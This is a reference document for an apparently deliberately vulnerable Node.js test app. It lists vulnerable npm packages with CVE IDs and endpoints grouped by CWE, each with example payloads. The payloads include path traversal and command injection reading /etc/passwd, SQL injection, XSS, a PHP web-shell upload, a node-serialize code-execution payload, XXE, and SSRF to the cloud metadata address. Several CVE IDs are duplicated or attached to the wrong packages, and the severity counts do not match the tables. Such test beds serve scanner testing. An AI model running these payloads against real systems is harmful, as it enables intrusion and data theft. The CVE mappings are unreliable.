# Security Vulnerabilities Reference

This document lists all intentional vulnerabilities in this test project with their CVE and CWE identifiers.

## Package Vulnerabilities (CVEs)

### Critical Severity
| Package | Version | CVE ID | Description |
|---------|---------|--------|-------------|
| `lodash` | 4.17.19 | CVE-2020-8203 | Prototype Pollution |
| `axios` | 0.21.1 | CVE-2021-3749 | SSRF vulnerability |
| `minimist` | 1.2.0 | CVE-2021-44906 | Prototype Pollution |
| `jsonwebtoken` | 8.5.1 | CVE-2022-23529 | Improper JWT validation |
| `handlebars` | 4.5.3 | CVE-2021-23383 | Remote Code Execution |
| `node-forge` | 0.9.0 | CVE-2020-7720 | Prototype Pollution |
| `ejs` | 2.7.4 | CVE-2022-29078 | Server-Side Template Injection |
| `node-serialize` | 0.0.4 | CVE-2017-5941 | Arbitrary Code Execution |
| `shelljs` | 0.8.3 | CVE-2020-7682 | Command Injection |
| `pug` | 2.0.4 | CVE-2021-21353 | Remote Code Execution |
| `mongodb` | 3.5.5 | CVE-2021-20329 | Injection vulnerability |
| `sequelize` | 5.21.5 | CVE-2023-22578 | SQL Injection |
| `node-sass` | 4.13.1 | CVE-2020-24025 | Remote Code Execution |

### High Severity
| Package | Version | CVE ID | Description |
|---------|---------|--------|-------------|
| `marked` | 0.3.9 | CVE-2022-21681 | XSS vulnerability |
| `xmldom` | 0.5.0 | CVE-2021-32796 | Prototype Pollution |
| `serialize-javascript` | 3.0.0 | CVE-2020-7660 | Code Injection |
| `dot-prop` | 4.2.0 | CVE-2020-8116 | Prototype Pollution |
| `yargs-parser` | 13.1.1 | CVE-2020-7608 | Prototype Pollution |
| `js-yaml` | 3.13.1 | CVE-2020-14343 | Code Injection |
| `ini` | 1.3.5 | CVE-2020-7788 | Prototype Pollution |
| `socket.io` | 2.3.0 | CVE-2020-28481 | XSS vulnerability |
| `bl` | 1.2.2 | CVE-2020-8244 | Buffer overflow |
| `kind-of` | 6.0.2 | CVE-2019-20149 | Cache Poisoning |
| `set-value` | 2.0.0 | CVE-2019-10747 | Prototype Pollution |
| `mixin-deep` | 1.3.1 | CVE-2019-10746 | Prototype Pollution |
| `ws` | 6.2.1 | CVE-2021-32640 | ReDoS vulnerability |
| `postcss` | 7.0.35 | CVE-2021-23368 | ReDoS vulnerability |
| `xml2js` | 0.4.19 | CVE-2023-0842 | Prototype Pollution |
| `express-fileupload` | 1.1.7 | CVE-2020-7699 | File upload bypass |
| `validator` | 10.11.0 | CVE-2021-3765 | ReDoS vulnerability |
| `express-jwt` | 5.3.3 | CVE-2020-15084 | Authentication bypass |
| `multer` | 1.4.2 | CVE-2022-24434 | Path traversal |
| `bcrypt` | 3.0.8 | CVE-2020-7689 | Timing attack |
| `webpack` | 4.41.5 | CVE-2021-23406 | Path traversal |
| `lodash.merge` | 4.6.1 | CVE-2020-8203 | Prototype Pollution |
| `lodash.template` | 4.4.0 | CVE-2019-10744 | Code Injection |
| `semver` | 5.7.1 | CVE-2022-25883 | ReDoS vulnerability |
| `ajv` | 6.10.0 | CVE-2020-15366 | Prototype Pollution |
| `colors` | 1.3.3 | CVE-2021-23567 | Prototype Pollution |
| `fstream` | 1.0.12 | CVE-2019-13173 | Path traversal |
| `growl` | 1.10.5 | CVE-2017-16042 | Command Injection |
| `static-eval` | 2.0.0 | CVE-2017-16226 | Sandbox escape |

### Medium Severity
| Package | Version | CVE ID | Description |
|---------|---------|--------|-------------|
| `node-fetch` | 1.7.3 | CVE-2020-15168 | URL spoofing |
| `prismjs` | 1.23.0 | CVE-2021-32723 | ReDoS vulnerability |
| `express` | 4.17.1 | CVE-2022-24999 | XSS vulnerability |
| `underscore` | 1.12.0 | CVE-2021-23358 | Arbitrary code execution |
| `trim-newlines` | 3.0.0 | CVE-2021-33623 | ReDoS vulnerability |
| `jquery` | 3.4.1 | CVE-2020-11023 | XSS vulnerability |
| `request` | 2.88.0 | CVE-2023-28155 | SSRF vulnerability |
| `tar` | 4.4.10 | CVE-2021-32803 | Arbitrary file creation |
| `elliptic` | 6.5.3 | CVE-2020-28498 | Signature malleability |
| `hosted-git-info` | 2.8.8 | CVE-2021-23362 | ReDoS vulnerability |
| `acorn` | 5.7.3 | CVE-2020-7598 | ReDoS vulnerability |
| `node-notifier` | 8.0.0 | CVE-2020-7789 | Command Injection |
| `trim` | 0.0.1 | CVE-2020-7753 | ReDoS vulnerability |
| `glob-parent` | 3.1.0 | CVE-2020-28469 | ReDoS vulnerability |
| `path-parse` | 1.0.6 | CVE-2021-23343 | ReDoS vulnerability |
| `ansi-regex` | 3.0.0 | CVE-2021-3807 | ReDoS vulnerability |
| `nth-check` | 1.0.2 | CVE-2021-3803 | ReDoS vulnerability |
| `tmpl` | 1.0.4 | CVE-2021-33623 | Code Injection |
| `cookie` | 0.4.0 | CVE-2020-7792 | Cookie parsing issue |
| `passport` | 0.4.1 | CVE-2022-25896 | Session fixation |
| `morgan` | 1.10.0 | CVE-2019-5413 | Information disclosure |
| `debug` | 2.6.9 | CVE-2017-16137 | ReDoS vulnerability |
| `uuid` | 3.3.2 | CVE-2021-3803 | Insecure randomness |
| `npm` | 6.14.4 | CVE-2021-39134 | Arbitrary package install |
| `body-parser` | 1.19.0 | CVE-2022-29167 | DoS vulnerability |
| `express-session` | 1.16.2 | CVE-2020-7729 | Session fixation |
| `querystring` | 0.2.0 | CVE-2021-3749 | Prototype Pollution |
| `cookie-parser` | 1.4.4 | CVE-2019-5481 | Cookie injection |
| `cors` | 2.8.5 | CVE-2023-45857 | CORS misconfiguration |
| `helmet` | 3.21.2 | CVE-2020-7736 | Header bypass |
| `bootstrap` | 4.3.1 | CVE-2019-8331 | XSS vulnerability |
| `base64-url` | 2.2.0 | CVE-2019-10744 | Code execution |
| `chownr` | 1.1.3 | CVE-2021-32803 | Race condition |
| `json-schema` | 0.2.3 | CVE-2021-3918 | Prototype Pollution |
| `forwarded` | 0.1.2 | CVE-2017-16014 | Header injection |

## Code Vulnerabilities (CWEs)

### CWE-22: Path Traversal
**Endpoints:**
- `GET /read-file-cwe22` - Path traversal in file read
- `POST /write-file-cwe22` - Path traversal in file write
- `GET /download-cwe22` - Directory traversal in download
- `DELETE /delete-file-cwe22` - Path traversal in file deletion
- `GET /list-dir-cwe22` - Directory listing traversal
- `GET /file` - Unsanitized file path

**Example Exploit:**
```bash
curl "http://localhost:3000/read-file-cwe22?file=../../../../etc/passwd"
```

### CWE-79: Cross-Site Scripting (XSS)
**Endpoints:**
- `GET /search-xss` - Reflected XSS
- `POST /comment-xss` - Stored XSS
- `GET /search` - Basic reflected XSS

**Example Exploit:**
```bash
curl "http://localhost:3000/search-xss?q=<script>alert('XSS')</script>"
```

### CWE-89: SQL Injection
**Endpoints:**
- `GET /user-sql` - SQL injection in queries
- `POST /login-sql` - SQL injection in authentication
- `GET /user` - Basic SQL injection

**Example Exploit:**
```bash
curl "http://localhost:3000/user-sql?id=1' OR '1'='1"
```

### CWE-94: Code Injection
**Endpoints:**
- `POST /eval-code-cwe94` - Direct eval() injection
- `POST /vm-run-cwe94` - VM context injection
- `POST /function-exec-cwe94` - Function constructor injection
- `POST /template-inject-cwe94` - Template injection
- `POST /require-inject-cwe94` - Dynamic require injection
- `GET /calc` - eval() based calculation

**Example Exploit:**
```bash
curl -X POST http://localhost:3000/eval-code-cwe94 -H "Content-Type: application/json" -d '{"code":"process.exit()"}'
```

### CWE-287: Improper Authentication
**Endpoints:**
- `POST /admin-access` - Authentication bypass
- `GET /weak-session` - Weak session management

**Example Exploit:**
```bash
curl -X POST http://localhost:3000/admin-access -H "Content-Type: application/json" -d '{"username":"user","isAdmin":"true"}'
```

### CWE-327: Use of Broken Cryptographic Algorithm
**Endpoints:**
- `GET /hash` - MD5 password hashing
- `POST /crypto-weak-key` - DES encryption

**Example:**
```bash
curl "http://localhost:3000/hash?password=test123"
```

### CWE-352: Cross-Site Request Forgery (CSRF)
**Endpoints:**
- `POST /transfer-money` - Missing CSRF token
- `POST /delete-account` - State-changing without CSRF

**Example Exploit:**
```html
<form action="http://localhost:3000/transfer-money" method="POST">
  <input name="amount" value="10000"/>
  <input name="to" value="attacker"/>
</form>
```

### CWE-400: Uncontrolled Resource Consumption
**Endpoints:**
- `POST /process-array` - DoS via large arrays
- `GET /recursive-operation` - Uncontrolled recursion
- `GET /memory-leak` - Memory leak

**Example Exploit:**
```bash
curl "http://localhost:3000/recursive-operation?depth=100000"
```

### CWE-434: Unrestricted File Upload
**Endpoints:**
- `POST /upload-file` - No file type validation
- `POST /avatar-upload` - Dangerous file extensions

**Example Exploit:**
```bash
curl -X POST http://localhost:3000/upload-file -H "Content-Type: application/json" -d '{"filename":"shell.php","content":"<?php system($_GET[\"cmd\"]); ?>"}'
```

### CWE-502: Deserialization of Untrusted Data
**Endpoints:**
- `POST /deserialize` - node-serialize vulnerability
- `POST /deserialize-eval` - Deserialization with eval
- `POST /deserialize-json` - Unsafe JSON parsing
- `POST /pickle-like` - Custom unsafe deserialization
- `POST /unsafe-deserialization` - JSON with reviver

**Example Exploit:**
```bash
curl -X POST http://localhost:3000/deserialize -H "Content-Type: application/json" -d '{"data":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"calc\");}()"}'
```

### CWE-611: XML External Entity (XXE)
**Endpoints:**
- `POST /parse-xml` - XXE vulnerability
- `POST /soap-request` - Untrusted XML processing
- `POST /xxe-vulnerable` - XXE with xml2js

**Example Exploit:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### CWE-732: Incorrect Permission Assignment
**Endpoints:**
- `POST /create-file-permissions` - World-writable files (777)
- `GET /sensitive-file` - Exposing sensitive files

**Example:**
```bash
curl -X POST http://localhost:3000/create-file-permissions -H "Content-Type: application/json" -d '{"filename":"secret.txt","content":"password123"}'
```

### CWE-776: XML Bomb (Billion Laughs)
**Endpoints:**
- `POST /xml-bomb` - XML entity expansion
- `POST /expand-entities` - Unlimited entity expansion

**Example Exploit:**
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

### CWE-798: Hard-coded Credentials
**Endpoints:**
- `GET /db-config` - Hardcoded database credentials
- `GET /service-auth` - Hardcoded service credentials
- `GET /hardcoded-credentials` - Multiple hardcoded secrets

**Credentials Found:**
- Database: `P@ssw0rd123`
- AWS Access Key: `AKIAIOSFODNN7EXAMPLE`
- JWT Secret: `my-secret-key`
- API Key: `sk-1234567890abcdef`

### CWE-918: Server-Side Request Forgery (SSRF)
**Endpoints:**
- `GET /proxy-cwe918` - Arbitrary URL fetching
- `POST /webhook-cwe918` - Webhook SSRF
- `GET /fetch-image-cwe918` - Image fetching SSRF
- `POST /api-forward-cwe918` - Open proxy
- `GET /metadata-cwe918` - Cloud metadata access
- `GET /fetch` - Basic SSRF

**Example Exploit:**
```bash
curl "http://localhost:3000/proxy-cwe918?url=http://169.254.169.254/latest/meta-data/"
```

### Additional CWEs

#### CWE-78: OS Command Injection
**Endpoints:**
- `GET /ping` - Command injection via ping
- `POST /spawn-process` - Spawn with shell injection
- `GET /shell-injection` - Shell command interpolation
- `GET /execute` - Arbitrary command execution

**Example Exploit:**
```bash
curl "http://localhost:3000/ping?host=localhost;cat%20/etc/passwd"
```

#### CWE-95: Eval Injection
**Endpoints:**
- `GET /calc` - eval() with user input
- `POST /eval-code-cwe94` - Direct eval injection
- `POST /vm-code` - VM eval escape

#### CWE-113: HTTP Response Splitting
**Endpoints:**
- `POST /unvalidated-redirect` - Header injection via redirect

#### CWE-200: Information Exposure
**Endpoints:**
- `GET /sensitive-data-log` - Logging sensitive data
- `GET /cleartext-transmission` - Cleartext API keys
- `GET /env` - Environment variable exposure

#### CWE-261: Weak Password Requirements
**Endpoints:**
- `GET /token` - Insecure random token generation
- `GET /insecure-random` - Weak random for security tokens

#### CWE-306: Missing Authentication
**Endpoints:**
- `GET /missing-rate-limit` - No rate limiting on auth endpoint

#### CWE-310: Cryptographic Issues
**Endpoints:**
- `GET /hash` - MD5 for passwords
- `POST /crypto-weak-key` - DES encryption

#### CWE-400: Resource Exhaustion
**Endpoints:**
- `POST /regex-test` - ReDoS vulnerability
- `POST /process-array` - Memory exhaustion

#### CWE-601: Open Redirect
**Endpoints:**
- `POST /unvalidated-redirect` - Unvalidated redirect

#### CWE-639: Insecure Direct Object Reference
**Endpoints:**
- `GET /file` - Direct file access without authorization

#### CWE-829: Inclusion of Functionality from Untrusted Control Sphere
**Endpoints:**
- `POST /require-inject-cwe94` - Dynamic require with user input

## Testing Instructions

### Running the Application
```bash
npm install
node app.js
```

### Testing with Security Scanners

#### CodeQL
```bash
codeql database create mydb --language=javascript
codeql database analyze mydb --format=sarif-latest --output=results.sarif
```

#### npm audit
```bash
npm audit
npm audit --json > audit-results.json
```

#### Snyk
```bash
snyk test
snyk monitor
```

#### OWASP Dependency-Check
```bash
dependency-check --project test_node_dependency_issues --scan .
```

### Manual Testing Examples

**SQL Injection:**
```bash
curl "http://localhost:3000/user?id=1' OR '1'='1--"
```

**XSS:**
```bash
curl "http://localhost:3000/search?q=<img src=x onerror=alert('XSS')>"
```

**Command Injection:**
```bash
curl "http://localhost:3000/ping?host=localhost;whoami"
```

**Path Traversal:**
```bash
curl "http://localhost:3000/file?name=../../../etc/passwd"
```

**SSRF:**
```bash
curl "http://localhost:3000/fetch?url=http://localhost:22"
```

## Summary

- **Total Packages with CVEs:** 78
- **Critical CVEs:** 13
- **High CVEs:** 28
- **Medium CVEs:** 37
- **Total CWE Categories:** 20+
- **Total Vulnerable Endpoints:** 60+

This project is intentionally vulnerable for testing purposes only. **Never use in production.**
